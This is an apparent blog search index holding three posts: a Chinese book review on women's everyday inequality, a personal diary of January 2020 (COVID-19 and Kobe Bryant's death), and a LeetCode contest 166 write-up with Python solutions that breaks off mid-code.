<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>理解平凡女性的小部分生活</title>
      <link href="/2020/02/06/%E7%90%86%E8%A7%A3%E5%B9%B3%E5%87%A1%E5%A5%B3%E6%80%A7%E7%9A%84%E7%94%9F%E6%B4%BB/"/>
      <content type="html"><![CDATA[<blockquote><p>女人，承受了太多别人觉得你应该承受的”义务“。</p><p>​                                                            ——读《82年生的金智英》</p></blockquote><a id="more"></a><p>其实，读完这本书的时候，感触很多却都堵在嗓子眼，而不知该从何说起。而这个题目，我思考了半天，却依然表达不出自己现在的情绪。</p><p>我也不知道自己为什么会在当下多灾多难的压抑氛围下，选了这本书。当时，在豆瓣上看到这本书的介绍（也是书中的题记）时，我就想自己真的理解过女性的生活？</p><blockquote><p>她就是在这样的教育下长大的——女孩子凡事要小心，穿着要保守，行为要检点，危险的时间、危险的人要自己懂得避开，<u>否则问题出在不懂得避开的人身上</u>。    ——82年生的金智英 [韩]赵南柱</p></blockquote><p>以下均是我从自己生活经历中所去理解的感受，如果有任何不对的地方，请指正。</p><h3 id="小时候"><a href="#小时候" class="headerlink" title="小时候"></a>小时候</h3><p>小时候，偶尔都会听说女生相比男生早熟。在老师们都比较避讳性教育知识的年代，我也不是很懂，我只记得那时候女孩子普遍都会比男孩子高一些或者差不多高。后来，上了中学才知道，原来当时说的是生理上的早熟。现在想来，可能小时候她们就已经经历了难以想象的委屈。自己是姐姐的话，在应当自己被好好呵护的年纪就要去照顾弟弟，帮忙分担家务。小时候，虽然学校的值日卫生打扫和父母教育我们做家务，在看这本书之前，我甚至还觉得没有任何差别。但是这两天，我努力去回忆依稀能够记得的一些场景与对话。现在细细想来，看起来教育的方式相同，教育的目的或许是千差万别。教育女生做家务事希望能让她早点帮家里分担家务，是理所应当的”义务“，教育男生做家务仿佛是给他们增加一个加分项的技能，记得曾经过去有段时间我会炒个菜，炒个饭，都被我妈跟朋友们夸耀了一番，真的是可笑又可悲。</p><p>平时和朋友聊天时，总会遇到“我先去擦地”、“我先去做饭”的回复。在家里，我好像从来不会主动的去擦地和做饭，只有在家里没人或者需要帮忙的时候去做饭和擦地。</p><p>现在，能记得的一个对话如下（也不知道是发生在什么时候了，也可能是中学或大学吧）：</p><p>女：”你们男生在家里，内裤是自己洗，还是妈妈洗？”</p><p>男：“应该都是妈妈洗吧”</p><h3 id="上学"><a href="#上学" class="headerlink" title="上学"></a>上学</h3><p>爸妈那一代人，许多都是为了自己的哥哥弟弟能读书而早早地去工作。我上学的时候，我家这个小县城可能这种情况会比较少。在困难的地方，这种矛盾会更普遍地存在。我现在回想自己上学时的校服都是男女相同的运动服，而不像“金智英”生活的年代穿的是制服，有诸多不便，也因此被学校和老师加上了许多条条框框：”女生的制服裙子长度一定要超过膝盖，也不能露出臀部和大腿曲线；夏季制服的白衬衫因为很容易透，规定内里要穿着圆领无袖白汗衫，不能擅自改穿细肩带背心或白色T恤……。男同学除了不可以把裤管修改得过宽或过窄，其他不符合校规的穿着，老师通常会睁一只眼闭一只眼“。现在，随着条件越来越好，不少的学校也都开始学习国外采用制服式的校服，我不知道到底是出于美观的原因，或是个性化发展的原因，还是为了让学生早点形成男女观念，而进行的改变。在现下的对于女性的刻板印象和固化在骨子里的歧视，以及成年人仍然谈“性”色变的大环境下，这种改变会不会加重男女之间的不平等？</p><p>这和其他的方面比起来，已经是微不足道的了。</p><h3 id="职场"><a href="#职场" class="headerlink" title="职场"></a>职场</h3><p>我还没工作，也就只能借一些类似的情况去感受“金智英”在工作中所受的不平等。自己在大学四年，当时进学院学生会主要是为了多认识一些朋友，但是也观察到一个现象，我在学院学生会的三年的主席都是男生。在自己准备保研的期间，也偶尔会听说某些专业某些老师不喜欢招女生。巧得是，我们组除了一个师姐全是男生，其中原因就不清楚了。而前一些年的时候，经常还能看到招聘时，主管会问女生是不是单身、有没有结婚的打算、打算什么时候生孩子。现在好像被禁止询问此类隐私问题了，但是工作中其他的方面呢？现在的领导层不恰好都是经历重男轻女时代的人吗？</p><h3 id="家庭"><a href="#家庭" class="headerlink" title="家庭"></a>家庭</h3><blockquote><p>”所以你失去了什么？”</p><p>“啊？”</p><p>“你不是说叫我不要老是只想着失去吗？我现在很可能会因为生孩子而失去青春、健康、工作，以及同事、朋友等社会人脉，还有我的人生规划、未来梦想等种种，所以才会一直只看见自己失去的东西，但是你呢？你会失去什么？”</p><p>——82年生的金智英</p></blockquote><p>这是“金智英”在书中为数不多的为自己发声。是的，有时候我们过于渲染母爱的伟大，正是这种过分的夸大让“妈妈”的肩上多的许多不应该独自承受的担子，人人打着母爱的旗号去压迫和压榨母亲的身心健康，这难道不也是PUA吗？母爱是一位母亲或者说女性与生俱来的一种力量，她们自己懂得如何去运用这种力量，而不需要别人追着她们，逼迫着她们用这份力量去完成本不属于她们的“义务”。</p><p>作为丈夫和父亲，在妻子疲于工作，家务和照顾孩子的时候，你不应该说“帮”她去做一些事情。你只用默默地做完家务照顾好孩子，因为这不应当是你的发善心帮别人的事，这本来也就是你该有的义务和责任。</p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>我很庆幸自己读了这本书，最后分享一句话：</p><blockquote><p>Feminism is not about man hate, it’s really not. If you believe in equality, you are a feminist.</p><p>女性主义从不等于厌恶男性，但凡相信平等的人，都是女性主义者。</p></blockquote>]]></content>
      
      
        <tags>
            
            <tag> 读后感 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2020纪实</title>
      <link href="/2020/01/30/2020%E7%BA%AA%E5%AE%9E/"/>
      <content type="html"><![CDATA[<blockquote><p>记录我记忆中的2020</p></blockquote><a id="more"></a><h2 id="January"><a href="#January" class="headerlink" title="January"></a>January</h2><h4 id="新冠状病毒肺炎"><a href="#新冠状病毒肺炎" class="headerlink" title="新冠状病毒肺炎"></a>新冠状病毒肺炎</h4><p>这个月可能是自打我懂事后，才清楚地意识和理解了病毒传染病的厉害吧。2003年非典的时候，才刚上小学一二年级，我也不知道那是什么，隐约中只记得多洗手，别到处摸脏东西，每天进学校都要量体温。这次的疫情来的更凶猛，潜伏期长，毒性比非典低，导致传染性更强。的确这次武汉zf有着不可推卸的责任，但是引起恐慌和采取适当防控措施，以及恐慌和警示的程度都是一个balance的问题。相比起现在的状况，zf踩过平衡点导致被骂，后者可能反而是个更容易让群众接受（回忆了一下，毕竟大家对于与自己无关的事件的舆论不太会超过一周吧）。现在不管说什么都是马后炮了，但是我还是说一句，这一届武汉leader真的不行。</p><p>还有一些有趣的事情：</p><ol><li>人民自发给灾区寄了很多医用物资，zf和红十字说统一调控，工厂复工加班加点，但是各大医院仍然在网上发帖求助。</li><li>这两天我自己的家乡，也是很优秀。充分发挥了任何事都要争第一的民风，站上了感染人数榜单的前几名，力压湖北好几个市。</li><li>网上大家众志成城，万众一心。生活中，给人家家门口贴上，“此户系湖北武汉返乡人员”。各村各乡封村封乡，当然觉得在人人自危的情况下，这不失是一种办法（看湖北封了，跟着做准没错），只不过带点歧视罢了。</li><li>自从我家乡上榜后，原先用在武汉乡亲们的表情包或玩笑话，改成了我们之后，引起了朋友们的强烈反感。Fine，我知道别人这么做是不对的，也带有歧视。可是前两天我们不还在发着有关武汉的段子吗？又有什么资格去谴责别人。我觉得这件事可能得从一个叫袁隆平的老爷爷说起吧。所以，劝大家还是善良点吧。</li></ol><p>在家里待久了，相比起在规律工作学习时挤着时间看剧，长时间的视频反而不太能引起我多巴胺的分泌了。现在年龄在与朋友之间有效的聊天和社交以及健身后的成就感，更能让我身心愉悦。</p><p>和大家分享最近看到很有意思的一句话：</p><blockquote><p>人能从历史中所学习到的就是：永远学不会历史的教训。——来自一位网友对武汉zf的吐槽</p></blockquote><h4 id="Kobe去世"><a href="#Kobe去世" class="headerlink" title="Kobe去世"></a>Kobe去世</h4><p>到现在回想起来，那天过得像一场梦一样。早上8点，我被尿憋醒了，去上了厕所回来之后，习惯性地打开手机看到同学发了一个群消息说：“科……科比死了？“</p><p>我心想是不是在家闲的，看了假消息。我就睡过去了。再醒来之后，整个朋友圈一片灰白。我就意识到事情真的不对劲了。我去推上看消息，一开始不敢相信，不愿意相信，最后不得不信。</p><p>从小到大，我都没追过星，科比是我唯一的偶像。小时候经常看NBA的球赛，到高中不怎么看球赛。还记得最后在大学的实验室里跟同学一起看科比的退役赛。对于科比和GIGI的去世，真的是令人惋惜，可能真的是天妒英才吧。</p><p>你每天不断朝着自己的目标努力着，拖着伤病的身体依然奋战在球场，站在巅峰的你无人能及。你的光芒如此耀眼，让人们看不清你脸上挂满的汗水。在你退役时满脸的不舍与无奈，原本能开始人生的第二阶段，做一个幸福的丈夫和父亲。可是……</p><blockquote><p>Wish you can play basketball in paradise. Rest In Peace.</p></blockquote>]]></content>
      
      
        <tags>
            
            <tag> about-myself </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>LeetCode Competitions - 166</title>
      <link href="/2019/12/09/LeetCode-Competitions-166/"/>
      <content type="html"><![CDATA[<blockquote><p>Rank: 350/1675。</p></blockquote><ul><li>[Solved] stands for that the problems are solved in the competition.</li><li>[Unsolved] stands for that I failed to solve them in the competition.</li></ul><a id="more"></a><h2 id="Solved-1281-Subtract-the-Product-and-Sum-of-Digits-of-an-Integer"><a href="#Solved-1281-Subtract-the-Product-and-Sum-of-Digits-of-an-Integer" class="headerlink" title="[Solved] 1281. Subtract the Product and Sum of Digits of an Integer"></a>[Solved] 1281. Subtract the Product and Sum of Digits of an Integer</h2><h3 id="Description："><a href="#Description：" class="headerlink" title="Description："></a>Description：</h3><p>Given an integer number n, return the difference between the product of its digits and the sum of its digits.</p><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input: n = 234</span><br><span class="line">Output:<span class="number"> 15 </span></span><br><span class="line">Explanation: </span><br><span class="line">Product of digits =<span class="number"> 2 </span>*<span class="number"> 3 </span>*<span class="number"> 4 </span>=<span class="number"> 24 </span></span><br><span class="line">Sum of digits =<span class="number"> 2 </span>+<span class="number"> 3 </span>+<span class="number"> 4 </span>=<span class="number"> 9 </span></span><br><span class="line">Result =<span class="number"> 24 </span>-<span class="number"> 9 </span>= 15</span><br></pre></td></tr></table></figure><h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2:"></a>Example 2:</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input: n = 4421</span><br><span class="line">Output: 21</span><br><span class="line">Explanation: </span><br><span class="line">Product of digits =<span class="number"> 4 </span>*<span class="number"> 4 </span>*<span class="number"> 2 </span>*<span class="number"> 1 </span>=<span class="number"> 32 </span></span><br><span class="line">Sum of digits =<span class="number"> 4 </span>+<span class="number"> 4 </span>+<span class="number"> 2 </span>+<span class="number"> 1 </span>=<span class="number"> 11 </span></span><br><span class="line">Result =<span class="number"> 32 </span>-<span class="number"> 11 </span>= 21</span><br></pre></td></tr></table></figure><h3 id="Constraints"><a href="#Constraints" class="headerlink" title="Constraints:"></a>Constraints:</h3><ul><li><code>1 &lt;= n &lt;= 10^5</code></li></ul><h3 id="Idea："><a href="#Idea：" class="headerlink" title="Idea："></a>Idea：</h3><p>The straight idea is that compute the product and sum of the integer respectively and then<br>get the answer.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Time complexity : O(N), N is the number of the digits</span></span><br><span class="line"><span class="comment"># Space complexity : O(N)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">subtractProductAndSum</span><span class="params">(self, n: int)</span> -&gt; int:</span></span><br><span class="line">        digits = []</span><br><span class="line">        prod = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> n != <span class="number">0</span> :</span><br><span class="line">            tmp = n%<span class="number">10</span></span><br><span class="line">            digits.append(tmp)</span><br><span class="line">            prod *= tmp</span><br><span class="line">            n = n // <span class="number">10</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> prod - sum(digits)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">The space can be optimized to O(1). The product and the sum can be computed in each </span></span><br><span class="line"><span class="string">loop without the list.</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">subtractProductAndSum</span><span class="params">(self, n: int)</span> -&gt; int:</span></span><br><span class="line">        <span class="comment"># digits = []</span></span><br><span class="line">        prod = <span class="number">1</span></span><br><span class="line">        _sum = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> n != <span class="number">0</span> :</span><br><span class="line">            tmp = n%<span class="number">10</span></span><br><span class="line">            <span class="comment"># digits.append(tmp)</span></span><br><span class="line">            _sum += tmp</span><br><span class="line">            prod *= tmp</span><br><span class="line">            n = n // <span class="number">10</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> prod - _sum</span><br></pre></td></tr></table></figure><h2 id="Solved-1282-Group-the-People-Given-the-Group-Size-They-Belong-To"><a href="#Solved-1282-Group-the-People-Given-the-Group-Size-They-Belong-To" class="headerlink" title="[Solved] 1282. Group the People Given the Group Size They Belong To"></a>[Solved] 1282. Group the People Given the Group Size They Belong To</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h3><p>There are n people whose <strong>IDs</strong> go from 0 to n - 1 and each person belongs <strong>exactly</strong> to one group. Given the array groupSizes of length n telling the group size each person belongs to, return the groups there are and the people’s <strong>IDs</strong> each group includes.</p><p>You can return any solution in any order and the same applies for <strong>IDs</strong>. Also, it is guaranteed that there exists at least one solution. </p><h3 id="Example-1-1"><a href="#Example-1-1" class="headerlink" title="Example 1:"></a>Example 1:</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: groupSizes = [<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>]</span><br><span class="line">Output: <span class="string">[[5],[0,1,2],[3,4,6]]</span></span><br><span class="line">Explanation: </span><br><span class="line">Other possible solutions are <span class="string">[[2,1,6],[5],[0,4,3]]</span> <span class="keyword">and</span> <span class="string">[[5],[0,6,2],[4,3,1]]</span>.</span><br></pre></td></tr></table></figure><h3 id="Example-2-1"><a href="#Example-2-1" class="headerlink" title="Example 2:"></a>Example 2:</h3><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: groupSizes = <span class="comment">[2,1,3,3,3,2]</span></span><br><span class="line">Output: <span class="comment">[<span class="comment">[1]</span>,<span class="comment">[0,5]</span>,<span class="comment">[2,3,4]</span>]</span></span><br></pre></td></tr></table></figure><h3 id="Constraints-1"><a href="#Constraints-1" class="headerlink" title="Constraints:"></a>Constraints:</h3><ul><li><code>groupSizes.length == n</code></li><li><code>1 &lt;= n &lt;= 500</code></li><li><code>1 &lt;= groupSizes[i] &lt;= n</code></li></ul><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea:"></a>Idea:</h3><p>Here is a simple rule which can be easily found, when we try to<br>figure out the calculation process of the example 1. We allocate the <strong>groupSize</strong> space to store the <strong>IDs</strong>, if there is no corresponding group, and put the ID in it when iterate the array. If any group is filled up, we append it into the result and then allocate a new group. Thus, it is the <strong>greedy</strong> algorithm.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Time Complexity : O(N)</span></span><br><span class="line"><span class="comment"># Space Complexity : O(N)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">groupThePeople</span><span class="params">(self, groupSizes: List[int])</span> -&gt; List[List[int]]:</span></span><br><span class="line">        result = []</span><br><span class="line">        d = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> ID, group_size <span class="keyword">in</span> enumerate(groupSizes):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> group_size <span class="keyword">in</span> d:</span><br><span class="line">                d[group_size] = [ID]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> len(d[group_size]) == group_size:</span><br><span class="line">                    result.append(d.pop(group_size))</span><br><span class="line">                    d[group_size] = [ID]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    d[group_size] += [ID]</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> d.keys():</span><br><span class="line">            result.append(d[key])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h2 id="Solved-1283-Find-the-Smallest-Divisor-Given-a-Threshold"><a href="#Solved-1283-Find-the-Smallest-Divisor-Given-a-Threshold" class="headerlink" title="[Solved] 1283. Find the Smallest Divisor Given a Threshold"></a>[Solved] 1283. Find the Smallest Divisor Given a Threshold</h2><h3 id="Description-1"><a href="#Description-1" class="headerlink" title="Description:"></a>Description:</h3><p>Given an array of integers <strong>nums</strong> and an integer <strong>threshold</strong>, we will choose a <strong>positive integer</strong> divisor and divide all the array by it and sum the result of the division. Find the <strong>smallest</strong> divisor such that the result mentioned above is less than or equal to <strong>threshold</strong>.</p><p>Each result of division is rounded to <strong>the nearest integer greater than or equal to that element</strong>. (For example: 7/3 = 3 and 10/2 = 5).</p><p>It is guaranteed that there will be an answer.</p><h3 id="Example-1-2"><a href="#Example-1-2" class="headerlink" title="Example 1:"></a>Example 1:</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">9</span>], threshold = <span class="number">6</span></span><br><span class="line">Output: <span class="number">5</span></span><br><span class="line">Explanation: We can <span class="built_in">get</span> <span class="keyword">a</span> <span class="built_in">sum</span> <span class="built_in">to</span> <span class="number">17</span> (<span class="number">1</span>+<span class="number">2</span>+<span class="number">5</span>+<span class="number">9</span>) <span class="keyword">if</span> <span class="keyword">the</span> divisor is <span class="number">1.</span> </span><br><span class="line">If <span class="keyword">the</span> divisor is <span class="number">4</span> we can <span class="built_in">get</span> <span class="keyword">a</span> <span class="built_in">sum</span> <span class="built_in">to</span> <span class="number">7</span> (<span class="number">1</span>+<span class="number">1</span>+<span class="number">2</span>+<span class="number">3</span>) <span class="keyword">and</span> <span class="keyword">if</span> <span class="keyword">the</span> divisor is <span class="number">5</span> <span class="keyword">the</span> <span class="built_in">sum</span> will be <span class="number">5</span> (<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">2</span>).</span><br></pre></td></tr></table></figure><h3 id="Example-2-2"><a href="#Example-2-2" class="headerlink" title="Example 2:"></a>Example 2:</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Input:</span> nums = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>], threshold = <span class="number">11</span></span><br><span class="line"><span class="symbol">Output:</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3:"></a>Example 3:</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Input:</span> nums = [<span class="number">19</span>], threshold = <span class="number">5</span></span><br><span class="line"><span class="symbol">Output:</span> <span class="number">4</span></span><br></pre></td></tr></table></figure><h3 id="Constraints-2"><a href="#Constraints-2" class="headerlink" title="Constraints:"></a>Constraints:</h3><ul><li><code>1 &lt;= nums.length &lt;= 5 * 10^4</code></li><li><code>1 &lt;= nums[i] &lt;= 10^6</code></li><li><code>nums.length &lt;= threshold &lt;= 10^6</code></li></ul><h3 id="Idea-1"><a href="#Idea-1" class="headerlink" title="Idea:"></a>Idea:</h3><p>At the beginning, I try to iterate the divisor from 1 to the max(nums). The time complexity of this algorithm is O(N**2) and the program exceeded the time limitation.</p><p>Then, I try to use the <strong>binary search</strong> algorithm and actually it is a easy way to pass all the test cases.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Time Complexity : O(nlogn)</span></span><br><span class="line"><span class="comment"># Space Complexity : O(1)</span></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">smallestDivisor</span><span class="params">(self, nums: List[int], threshold: int)</span> -&gt; int:</span></span><br><span class="line">        max_muminum = max(nums)</span><br><span class="line">        result = max_muminum</span><br><span class="line"></span><br><span class="line">        l, r = <span class="number">1</span>, max_muminum</span><br><span class="line">        <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">            mid = (l+r) &gt;&gt; <span class="number">1</span></span><br><span class="line">            _sum = [ceil(num / mid) <span class="keyword">for</span> num <span class="keyword">in</span> nums]</span><br><span class="line">            <span class="keyword">if</span> sum(_sum) &lt;= threshold:</span><br><span class="line">                result = min(result, mid)</span><br><span class="line">                r = mid - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                l = mid + <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h2 id="Unsolved-1284-Minimum-Number-of-Flips-to-Convert-Binary-Matrix-to-Zero-Matrix"><a href="#Unsolved-1284-Minimum-Number-of-Flips-to-Convert-Binary-Matrix-to-Zero-Matrix" class="headerlink" title="[Unsolved] 1284. Minimum Number of Flips to Convert Binary Matrix to Zero Matrix"></a>[Unsolved] 1284. Minimum Number of Flips to Convert Binary Matrix to Zero Matrix</h2><h3 id="Description-2"><a href="#Description-2" class="headerlink" title="Description:"></a>Description:</h3><p>Given a <code>m x n</code> binary matrix <code>mat</code>. In one step, you can choose one cell and flip it and all the four neighbours of it if they exist (Flip is changing 1 to 0 and 0 to 1). A pair of cells are called neighboors if they share one edge.</p><p>Return the minimum number of steps required to convert <code>mat</code> to a zero matrix or <strong>-1</strong> if you cannot.</p><p>Binary matrix is a matrix with all cells equal to 0 or 1 only.</p><p>Zero matrix is a matrix with all cells equal to 0.</p><h3 id="Example-1-3"><a href="#Example-1-3" class="headerlink" title="Example 1:"></a>Example 1:</h3><p><img src="https://assets.leetcode.com/uploads/2019/11/28/matrix.png" alt=""></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Inpu<span class="variable">t:</span> <span class="keyword">mat</span> = [[<span class="number">0</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">1</span>]]</span><br><span class="line">Outpu<span class="variable">t:</span> <span class="number">3</span></span><br><span class="line">Explanation: One possible solution <span class="keyword">is</span> <span class="keyword">to</span> flip (<span class="number">1</span>, <span class="number">0</span>) then (<span class="number">0</span>, <span class="number">1</span>) <span class="built_in">and</span> <span class="keyword">finally</span> (<span class="number">1</span>, <span class="number">1</span>) <span class="keyword">as</span> shown.</span><br></pre></td></tr></table></figure><h3 id="Example-2-3"><a href="#Example-2-3" class="headerlink" title="Example 2:"></a>Example 2:</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: mat = <span class="string">[[0]]</span></span><br><span class="line">Output: <span class="number">0</span></span><br><span class="line">Explanation: Given matrix is a zero matrix. We don<span class="string">'t need to change it.</span></span><br></pre></td></tr></table></figure><h3 id="Example-3-1"><a href="#Example-3-1" class="headerlink" title="Example 3:"></a>Example 3:</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: mat = <span class="string">[[1,1,1],[1,0,1],[0,0,0]]</span></span><br><span class="line">Output: <span class="number">6</span></span><br></pre></td></tr></table></figure><h3 id="Example-4"><a href="#Example-4" class="headerlink" title="Example 4:"></a>Example 4:</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: mat = <span class="string">[[1,0,0],[1,0,0]]</span></span><br><span class="line">Output: <span class="number">-1</span></span><br><span class="line">Explanation: Given matrix can<span class="string">'t be a zero matrix</span></span><br></pre></td></tr></table></figure><h3 id="Constraints-3"><a href="#Constraints-3" class="headerlink" title="Constraints:"></a>Constraints:</h3><ul><li><code>m == mat.length</code></li><li><code>n == mat[0].length</code></li><li><code>1 &lt;= m &lt;= 3</code></li><li><code>1 &lt;= n &lt;= 3</code></li><li><code>mat[i][j] is 0 or 1</code></li></ul><h3 id="Idea-2"><a href="#Idea-2" class="headerlink" title="Idea:"></a>Idea:</h3><blockquote><p>We store the states which are visited in a hashmap, and use the breadth first searching algorithm to enumerate all the flipping states. If the states are not visited before, we append them into the queue.<br>——“<a href="https://leetcode-cn.com/problems/minimum-number-of-flips-to-convert-binary-matrix-to-zero-matrix/solution/bfs-mei-ju-by-tfboy96/" target="_blank" rel="noopener">bfs 枚举，并记录矩阵状态</a>“</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Time complexity : O(2**(nm))</span></span><br><span class="line"><span class="comment"># Space complexity : O(2**(nm))</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> deepcopy</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minFlips</span><span class="params">(self, mat)</span>:</span></span><br><span class="line">        m = len(mat)</span><br><span class="line">        n = len(mat[<span class="number">0</span>])</span><br><span class="line">        visited = set()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># bfs</span></span><br><span class="line">        q = deque()</span><br><span class="line">        q.append(mat)</span><br><span class="line">        visited.add(str(mat))</span><br><span class="line">        target = [[<span class="number">0</span>]*n <span class="keyword">for</span> _ <span class="keyword">in</span> range(m)]</span><br><span 